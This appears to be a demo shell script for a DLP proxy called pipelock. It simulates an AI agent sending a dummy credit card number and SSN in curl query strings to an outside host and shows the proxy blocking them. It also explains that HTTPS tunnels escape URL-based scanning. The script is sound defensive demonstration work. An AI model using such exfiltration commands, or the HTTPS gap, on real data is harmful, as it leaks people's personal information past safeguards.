#!/bin/sh
# Demo 5 — PII in outbound requests: DLP scanner (visible in pipelock proxy log).
#
# Scenario: an agent tries to POST customer PII to an external endpoint — a
# credit card number and an SSN in a URL query param. The requests route
# through http://pipelock:8888 and the DLP scanner catches them before they
# leave the network.
#
# ── What you will see ─────────────────────────────────────────────────────────
#   In THIS terminal:
#     - The curl command being sent
#     - 403 Forbidden for each blocked request
#
#   In the HOST terminal (pipelock log):
#     - A "blocked" JSON event per request, with:
#         scanner : "dlp"
#         reason  : "DLP match: Credit Card Number (high)"
#         agent   : "opencode-pii-demo"
#       The matched value is automatically [redacted] from the log.
#
# ── Setup ─────────────────────────────────────────────────────────────────────
# Open a second terminal on the host and run:
#   docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'
#
# Then run this script from inside the agent container:
#   cd /workspace/attacks && sh 05-pii-outbound.sh
#
# ── Why plain HTTP? ───────────────────────────────────────────────────────────
# DLP scans the full URL of outbound requests. HTTPS traffic uses a CONNECT
# tunnel — pipelock sees only the hostname, not the path or query string, so
# the credit card regex never runs. That's a real limitation: URL-based DLP
# only works for http://, not https://. Use github.com (allowlisted) so the
# allowlist check passes and DLP gets a chance to inspect the URL.

set -eu

PROXY=http://pipelock:8888
AGENT_HEADER="X-Pipelock-Agent: opencode-pii-demo"

divider() { echo; echo "────────────────────────────────────────────────────"; echo "  $1"; echo "────────────────────────────────────────────────────"; echo; }

# ── Attempt 1: credit card number ─────────────────────────────────────────────

divider "Attempt 1 — credit card number in URL param"

CC="4532123456789012"
echo "Sending:"
echo "  curl -x $PROXY \"http://github.com/submit?card=\$CC\""
echo ""

CODE=$(curl -so /dev/null -w "%{http_code}" \
  -x "$PROXY" \
  -H "$AGENT_HEADER" \
  "http://github.com/submit?card=${CC}" || true)

echo "Response: $CODE"
if [ "$CODE" = "403" ]; then
  echo "Blocked — DLP scanner matched: Credit Card Number"
else
  echo "Unexpected response — check that pipelock is running (docker compose up -d pipelock)"
fi

# ── Attempt 2: SSN ────────────────────────────────────────────────────────────

divider "Attempt 2 — SSN in URL param"

SSN="123-45-6789"
echo "Sending:"
echo "  curl -x $PROXY \"http://github.com/submit?ssn=\$SSN\""
echo ""

CODE=$(curl -so /dev/null -w "%{http_code}" \
  -x "$PROXY" \
  -H "$AGENT_HEADER" \
  "http://github.com/submit?ssn=${SSN}" || true)

echo "Response: $CODE"
if [ "$CODE" = "403" ]; then
  echo "Blocked — DLP scanner matched: US Social Security Number"
else
  echo "Unexpected response — check that pipelock is running"
fi

# ── Wrap up ───────────────────────────────────────────────────────────────────

divider "Check the pipelock log on the host"

echo "You should see two 'blocked' events in the log:"
echo ""
echo "  { \"scanner\": \"dlp\","
echo "    \"reason\":  \"DLP match: Credit Card Number (high)\","
echo "    \"agent\":   \"opencode-pii-demo\","
echo "    \"url\":     \"http://github.com/[redacted]\" }"
echo ""
echo "  { \"scanner\": \"dlp\","
echo "    \"reason\":  \"DLP match: Social Security Number (low)\","
echo "    \"agent\":   \"opencode-pii-demo\","
echo "    \"url\":     \"http://github.com/[redacted]\" }"
echo ""
echo "Pipelock automatically redacts the matched value from its own log —"
echo "the credit card and SSN are never written to disk in plaintext."
echo ""
echo "Pull the current block count:"
echo "  curl -s http://127.0.0.1:8888/stats | jq '{blocked: .requests.blocked, top_scanners: .top_scanners}'"
